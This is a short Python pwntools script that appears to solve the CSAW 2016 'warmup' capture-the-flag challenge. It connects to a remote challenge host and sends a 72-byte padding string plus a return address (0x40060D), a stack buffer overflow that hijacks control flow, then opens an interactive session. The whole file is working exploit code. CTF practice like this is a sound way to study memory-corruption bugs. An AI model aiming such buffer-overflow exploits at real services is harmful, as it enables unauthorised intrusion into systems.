#!/usr/bin/env python
from pwn import *

#p = process("./warmup_csaw_2016")

p = remote("node3.buuoj.cn",25481)
payload ="a"*72 + "".join(map(p64,[0x40060D]))
p.sendline(payload)
p.interactive()

